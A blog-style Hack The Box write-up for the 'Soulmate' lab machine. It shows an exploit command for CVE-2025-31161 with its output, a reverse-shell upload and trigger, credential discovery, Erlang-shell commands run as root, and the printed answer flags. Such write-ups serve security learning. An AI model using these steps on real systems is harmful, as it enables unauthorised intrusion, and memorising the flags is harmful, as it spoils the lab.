---
title: Soulmate
date: 2026-03-10
readTime: 10 min
category: writeup
description: Hack The Box writeup for the Soulmate retired easy machine, covering CVE exploitation, web shell upload, and privilege escalation.
icon: 🖤
coverImage: /writeup_image/htb/soulmate.svg
Level: "Easy"
---

# Soulmate

![Soulmate screenshot](/writeup_image/htb/image.png)



### Overview

This box becomes straightforward once you:

- Identify the vulnerable component.
- Use the CVE to create an account.
- Upload and trigger a web shell.
- Enumerate locally to find credentials.
- Abuse the exposed Erlang shell path to gain root.

### What I had at the start

![soulmate 1](/writeup_image/htb/image-1.png)

At this point, this was as far as I could get.

![soulmate 2](/writeup_image/htb/image-2.png)

This is what I had at the time.

### Fingerprinting

Version:

```
11.W.657
```

A quick search pointed me to a working CVE.

![soulmate 3](/writeup_image/htb/image-3.png)

### Exploitation (CVE‑2025‑31161)

I used the following exploit to create a new user:

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password admin123
] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: test
   [*] Password: admin123.
```

### Getting a shell

After logging in, upload a PHP reverse shell and trigger it:

```bash
curl -v http://soulmate.htb/shell.php
```

![soulmate 4](/writeup_image/htb/image-4.png)

If you run into connection issues, make sure your listening port is allowed (for example, 4444):

```bash
sudo ufw allow 4444/tcp
```

### Local enumeration (linpeas)

Next, download and run `linpeas.sh`.

This is the way:

![soulmate 5](/writeup_image/htb/image-5.png)

To keep it simple, copy the most relevant output into ChatGPT and ask for the **most suspicious directories**. It often suggests what to review first.

In my case, it suggested checking:

- `/usr/local/lib/erlang_login/start.escript`

### SSH access (user flag)

After reviewing `/usr/local/lib/erlang_login/start.escript`, I found SSH credentials. Logging in allowed me to retrieve `user.txt`.

![soulmate 6](/writeup_image/htb/image-6.png)

### Root path: Erlang shell on port 2222

While reviewing `/usr/local/lib/erlang_login/start.escript`, I also noticed an Erlang shell exposed on port **2222**.

![soulmate 7](/writeup_image/htb/image-7.png)

Log in to SSH on port 2222:

```bash
ssh ben@localhost -p 2222
ben@localhost's password:
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
```

Privilege escalation via the Erlang shell:

```bash
(ssh_runner@soulmate)1> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

To retrieve the root flag:

```bash
os:cmd("cat /root/root.txt").
```

### Flags

- user flag: `85edf56dbb5bd3ec09959ab762dfca8e`
- root flag: `fb8fa5f46ea81c3a896aefcf13c163d1`

---

### Conclusion (takeaways)

If you take away one thing from this box, let it be this: **enumeration is a skill, not a step.**

- A small version string can be enough to map to a real-world vulnerability.
- A single unusual path in `/usr/local/lib` can change everything.
- “Internal” services (like an Erlang shell on a non-standard port) are still part of the attack surface.

When you get stuck, do not rush. Slow down, enumerate one layer deeper, and follow the clues. That mindset turns random attempts into repeatable wins.


**Follow:** [@dodgenefoli](https://twitter.com/dodgenefoli) **On Twitter !**